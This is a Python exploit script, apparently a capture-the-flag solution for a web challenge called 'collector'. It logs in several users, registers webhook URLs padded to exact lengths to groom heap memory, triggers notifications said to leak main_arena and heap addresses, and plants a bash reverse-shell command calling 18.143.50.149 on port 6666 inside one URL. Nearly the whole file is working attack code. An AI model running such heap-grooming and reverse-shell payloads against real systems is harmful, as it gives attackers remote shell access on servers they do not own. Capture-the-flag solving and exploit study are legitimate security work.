import requests
from pwn import *
import os

base_url = 'http://c3cb0aa7-ebd9-45c8-9c3c-e7b4c1b96285.collector.chal.pwni.ng:20000'
login_url = f"{base_url}/_m/2e7970cbec/loggingIn"
transact_url = f"{base_url}/_m/34a106c003/transacting"

item_map = {
    "gold": "0",
    "bomb": "32",
    "rum": "4",
    "anchor": "5",
}

def create_user(username, password):
    print(f'create_user {username}')
    session = requests.Session()
    data = {
        "redirectTo": "/",
        "username": username,
        "password": password,
    }
    resp = session.post(login_url, data=data)
    print(resp.status_code)
    return session

def watch(kind, url, session):
    print(f'Watch {kind}')
    data = {
        "size": "1",
        "item": item_map[kind],
        "kind": kind,
        "url": url,
        "secret": "123",
        "action": "watch",
    }
    resp = session.post(transact_url, data=data)
    print(resp.status_code)

def unwatch(kind, session):
    print(f'Unwatch {kind}')
    data = {
        "kind": kind,
        "action": "unwatch",
    }
    resp = session.post(transact_url, data=data)
    print(resp.status_code)

def notify(kind, session):
    print(f'Notify {kind}')
    data = {
        "size": "1",
        "item": item_map[kind],
        "kind": kind,
        "action": "notify",
    }
    resp = session.post(transact_url, data=data)
    print(resp.status_code)


# Create 3 users
# random_hex = os.urandom(5).hex()
random_hex = 'd0bebc4a8f'
s1 = create_user(f"user1-{random_hex}", "user1")
s2 = create_user(f"user2-{random_hex}", "user2")
s3 = create_user(f"user3-{random_hex}", "user3")

# Clean up hooks db
print("unwatch...")
unwatch("gold", s1)
unwatch("gold", s2)
unwatch("gold", s3)
unwatch("bomb", s1)
unwatch("rum", s1)
unwatch("anchor", s1)

# Watch gold
# Length need to be 0x4ff
gold_url_1 = 'http://18.143.50.149:4/?x=__/plugins___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________'

# Length need to be 0x43f
gold_url_2 = 'http://18.143.50.149:4/?x=__/plugins___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________'
watch("gold", gold_url_1, s1)
watch("gold", gold_url_1, s2)
watch("gold", gold_url_2, s3)

# Watch bomb
# Length need to be 0x7d7
bomb_url = 'http://18.143.50.149:4/?x=__/plugins___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________'
watch("bomb", bomb_url, s1)

# Watch rum
# Length need to be 0x7e8
rum_url = 'http://18.143.50.149:4/?x=__/plugins____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________'
watch("rum", rum_url, s1)

# Watch anchor
# Length need to be 0x800
# The position of `bash xxx` need to be exact with this position
anchor_url = 'http://18.143.50.149:4/?x=__/plugins______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________bash -c "bash -i >& /dev/tcp/18.143.50.149/6666 0>&1";________________________'
watch("anchor", anchor_url, s1)
print(f'Add some delay before continue...')
sleep(5)

# Notify gold
notify("gold", s1)
print(f'Add some delay before continue...')
sleep(6)

# Notify bomb
notify("bomb", s1)
print(f'Add some delay before continue...')
sleep(6)

# Notify rum (This will leak main_arena+96)
notify("rum", s1)
sleep(6)

# Notify rum (This will leak heap)
notify("anchor", s1)
sleep(3)

# Clean up hooks db
print("unwatch...")
unwatch("gold", s1)
unwatch("gold", s2)
unwatch("gold", s3)
unwatch("bomb", s1)
unwatch("rum", s1)
unwatch("anchor", s1)
